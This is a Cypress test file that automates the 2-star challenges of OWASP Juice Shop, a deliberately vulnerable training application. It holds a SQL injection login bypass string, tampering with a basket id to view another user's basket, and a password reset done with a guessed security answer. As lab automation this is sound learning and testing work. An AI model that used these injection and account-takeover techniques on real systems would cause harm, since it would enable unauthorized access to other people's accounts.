import firstVisitPopups from '../POM/FirstVisitPopups.pom';
import headerBar from '../POM/headerBar.pom';
import loginPage from '../POM/loginPage.pom';
import scoreBoard from '../POM/ScoreBoard.pom';
import resetPassword from '../POM/resetPassword.pom';
import registrationPage from '../POM/registrationPage.pom';
import sideNav from '../POM/sideNav.pom';
import complaint from '../POM/complaint.pom';

describe('OWASP JuiceShop Achivments unlocking Automation', () => {
  context('2 - stars vulnerabilities', () => {

    before(() => {
      cy.visit('/');
      cy.wait(2000);
      firstVisitPopups.closeFirstVisitMesseges();
    });

    beforeEach(() => {
      Cypress.Cookies.preserveOnce('cookieconsent_status', 'welcomebanner_status', 'language');
      cy.visit('/');
    });

    it('1 - Login Admin', () => {
      loginPage.login("' OR '1'='1'--", " ");
      scoreBoard.checkIsAchivSolvedXHR('Login Admin');
    });

    it('2 - Admin Section', () => {
      //path found in main-es2018.js file
      cy.visit('/#/administration');
      scoreBoard.checkIsAchivSolvedXHR('Admin Section');
    });

    it('3 - View Basket', () => {
      loginPage.login("' OR '1'='1'--", " ");
      headerBar.basketButon().click();
      cy.window()
        .its("sessionStorage").then((storage) => {
          storage.bid = 2;
        });
      cy.reload();
      scoreBoard.checkIsAchivSolvedXHR('View Basket');
    });

    it('4 - Get rid of all 5-star customer feedback', () => {
      loginPage.login("' OR '1'='1'--", " ");
      cy.intercept('GET', '/rest/products/').as('getProducts');
      cy.visit('/#/administration');
      cy.wait('@getProducts');
      cy.get("div[class='customer-table'] mat-row", { timeout: 10000 }).each((customerFeedback) => {
        if(customerFeedback.find("mat-icon").length === 5){
          customerFeedback.find("button").click();
        }
      });
      scoreBoard.checkIsAchivSolvedXHR('Five-Star Feedback');
    });

    it('5 - Meta Geo Stalking', () => {
      //used meta data from Photo Wall img and admin section(email)
      const newPassword = 'newPassword123.';
      const securityAnswer = 'Daniel Boone National Forest';
      const johnEmail = 'john@juice-sh.op';
      resetPassword.resetPassword(johnEmail, newPassword, securityAnswer)
      scoreBoard.checkIsAchivSolvedXHR('Meta Geo Stalking');
    });

    it('6 -  Deprecated Interface', () => {
      const filepath = 'test1.xml';
      registrationPage.register();
      loginPage.login(registrationPage.userEmail, registrationPage.userPassword);
      sideNav.navigateToComplaint();
      complaint.sendComplaint(filepath);
      scoreBoard.checkIsAchivSolvedXHR('Deprecated Interface');
    });

    it.only('7 - Login MC SafeSearch', () => {
      const MCSafeSearchEmail = 'mc.safesearch@juice-sh.op';
      const MCSafeSearchPass = 'Mr. N00dles';
      
      loginPage.login(MCSafeSearchEmail, MCSafeSearchPass);
      scoreBoard.checkIsAchivSolvedXHR('Login MC SafeSearch');
    });
  });
});
